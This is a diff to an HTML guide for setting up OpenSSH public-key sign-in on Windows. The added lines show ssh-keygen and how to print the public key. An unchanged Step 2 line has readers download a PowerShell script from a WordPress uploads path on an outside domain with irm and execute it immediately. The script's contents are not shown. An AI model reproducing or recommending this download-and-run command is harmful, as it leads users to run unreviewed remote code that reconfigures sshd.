@@ -63,6 +63,10 @@ New-NetFirewallRule -Name OpenSSH-Server-In-TCP -DisplayName "OpenSSH Server (ss
     <h3>Step 2 — Add the key</h3>
     <p>Copy the account’s public key first, or paste a URL that serves it (for example <code>https://github.com/alice.keys</code>) at the prompt.</p>
     <pre><code>&amp; ([scriptblock]::Create((irm https://wp-opsec.eagleeye-intelligence.com/wp-content/uploads/thessley-downloads/windows-office-client.ps1))) -SshOnly</code></pre>
+    <p>No key yet? The normal exchange is two commands on the computer you connect <em>from</em>:</p>
+    <pre><code>ssh-keygen -t ed25519 -C "alice@laptop"
+cat ~/.ssh/id_ed25519.pub      # PowerShell: Get-Content $env:USERPROFILE\.ssh\id_ed25519.pub</code></pre>
+    <p>Paste that line at the installer prompt, or point the installer at a file or URL with <code>-KeyUrl</code>.</p>
     <p>It adds the key with Windows sshd’s ACLs, sets <code>PubkeyAuthentication yes</code>, turns password sign-in off and restarts <code>sshd</code>. Then test it from another computer: <code>ssh -i &lt;key&gt; &lt;user&gt;@&lt;host&gt;</code>.</p>
 
     <h3>Step 3 — The office logon model</h3>
